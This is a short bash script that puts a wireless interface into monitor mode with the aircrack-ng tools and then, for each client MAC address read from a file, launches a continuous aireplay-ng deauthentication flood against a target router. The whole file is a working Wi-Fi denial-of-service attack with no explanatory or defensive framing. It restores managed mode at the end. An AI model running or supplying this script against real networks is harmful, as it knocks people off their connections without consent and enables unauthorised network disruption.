#!/bin/bash

router_mac=$(sudo cat _gateway/BSSID.txt)
interface=$(sudo cat _gateway/IF.txt)
macs="store/txt/file.txt"

sudo ifconfig "$interface" down
sudo airmon-ng check kill
sudo iwconfig "$interface" mode monitor
sudo ifconfig "$interface" up
sudo airodump-ng "$interface" 
sudo bash deauth_2.sh

while read -r val
do
sudo aireplay-ng --deauth 0 -a "$router_mac" -c "$val" "$interface"&
done < $macs

sudo ifconfig "$interface" down
sudo iwconfig "$interface" mode managed
sudo service NetworkManager restart
